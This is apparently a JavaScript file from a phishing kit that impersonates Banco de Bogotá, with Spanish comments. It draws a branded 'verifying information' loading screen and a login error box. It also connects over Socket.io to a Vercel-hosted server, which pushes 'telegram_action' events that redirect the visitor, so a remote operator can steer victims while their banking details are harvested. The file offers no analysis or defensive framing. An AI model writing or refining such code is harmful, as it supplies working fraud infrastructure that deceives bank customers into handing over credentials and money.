// Namespace para utilidades comunes
window.commonUtils = {
    // Inicialización de funciones comunes
    initializeCommon: function() {
        console.log('Inicializando funciones comunes...');
        
        // Esperar a que el DOM esté listo antes de crear elementos
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                this.createLoadingScreen();
                this.createErrorMessage();
                this.initializeSocket();
            });
        } else {
            this.createLoadingScreen();
            this.createErrorMessage();
            this.initializeSocket();
        }
        
        console.log('Funciones comunes inicializadas');
    },

    // Inicializar Socket.io
    initializeSocket: function() {
        console.log('Inicializando Socket.io...');
        try {
            if (!window.socket && typeof io !== 'undefined') {
                // Determinar la URL base según el entorno
                const isVercel = window.location.hostname.includes('vercel.app');
                const socketUrl = isVercel 
                    ? 'https://sucursbogotapersonas.vercel.app'
                    : 'http://localhost:3000';

                console.log('Conectando a Socket.io en:', socketUrl);
                window.socket = io(socketUrl, {
                    transports: ['websocket', 'polling']
                });
                
                window.socket.on('connect', () => {
                    console.log('✅ Socket.io conectado - ID:', window.socket.id);
                    this.hideLoading();
                });

                window.socket.on('telegram_action', (data) => {
                    console.log('🔄 Acción recibida:', data);
                    this.hideLoading();
                    
                    if (data.redirect) {
                        console.log('📍 Redirigiendo a:', data.redirect);
                        if (data.message) {
                            sessionStorage.setItem('actionMessage', data.message);
                        }
                        setTimeout(() => {
                            window.location.href = data.redirect;
                        }, 100);
                    }
                });

                window.socket.on('disconnect', () => {
                    console.log('❌ Socket.io desconectado');
                });

                window.socket.on('connect_error', (error) => {
                    console.error('❌ Error de conexión:', error.message);
                });
            }
        } catch (error) {
            console.error('❌ Error inicializando Socket.io:', error);
        }
    },

    // Crear pantalla de carga - CON VERIFICACIÓN DE SEGURIDAD
    createLoadingScreen: function() {
        // Verificar que el DOM esté listo
        if (!document.head || !document.body) {
            console.warn('DOM no está listo, reintentando en 100ms...');
            setTimeout(() => this.createLoadingScreen(), 100);
            return;
        }

        if (document.querySelector('.loading-screen')) return;
        
        const loadingScreen = document.createElement('div');
        loadingScreen.className = 'loading-screen';
        loadingScreen.innerHTML = `
            <div class="loading-content">
                <img src="Imagenes/banco-de-bogota.png" alt="Banco de Bogotá" class="loading-logo">
                <div class="spinner"></div>
                <p class="loading-text">Verificando información...</p>
            </div>
        `;
        
        const styleSheet = document.createElement("style");
        styleSheet.textContent = `
            .loading-screen {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background-color: rgba(255, 255, 255, 0.98);
                z-index: 9999;
                justify-content: center;
                align-items: center;
                flex-direction: column;
            }
            .loading-screen.active {
                display: flex !important;
            }
            .loading-content {
                text-align: center;
            }
            .loading-logo {
                width: 150px;
                margin-bottom: 2rem;
            }
            .spinner {
                width: 50px;
                height: 50px;
                border: 5px solid #f3f3f3;
                border-top: 5px solid #0051BB;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin: 0 auto 20px;
            }
            .loading-text {
                font-size: 18px;
                color: #333;
                margin: 0;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        
        // Verificar nuevamente antes de append
        if (document.head && document.body) {
            document.head.appendChild(styleSheet);
            document.body.appendChild(loadingScreen);
        } else {
            console.error('No se pudo crear loading screen: DOM no disponible');
        }
    },

    // ... el resto de las funciones se mantienen igual
    createErrorMessage: function() {
        if (!document.body) {
            setTimeout(() => this.createErrorMessage(), 100);
            return;
        }
        
        if (document.querySelector('.login-error')) return;
        
        const errorMessage = document.createElement('div');
        errorMessage.className = 'login-error';
        errorMessage.style.cssText = `
            display: none;
            background-color: #fff2f2;
            border: 1px solid #ffcdd2;
            color: #d32f2f;
            padding: 1rem;
            border-radius: 8px;
            margin: 1rem 0;
            text-align: center;
        `;
        
        const container = document.querySelector('.login-section') || document.body;
        if (container) {
            container.appendChild(errorMessage);
        }
    },

    // Mostrar pantalla de carga
    showLoading: function(message = 'Verificando información...') {
        const loadingScreen = document.querySelector('.loading-screen');
        if (loadingScreen) {
            const loadingText = loadingScreen.querySelector('.loading-text');
            if (loadingText) {
                loadingText.textContent = message;
            }
            loadingScreen.classList.add('active');
            document.body.style.overflow = 'hidden';
        }
    },

    // Ocultar pantalla de carga
    hideLoading: function() {
        const loadingScreen = document.querySelector('.loading-screen');
        if (loadingScreen) {
            loadingScreen.classList.remove('active');
            document.body.style.overflow = '';
        }
    },

    // Mostrar mensaje de error
    showError: function(message) {
        const errorMessage = document.querySelector('.login-error');
        if (errorMessage) {
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
            setTimeout(() => {
                errorMessage.style.display = 'none';
            }, 5000);
        }
    }
};

// Variables globales
window.isSubmitting = false;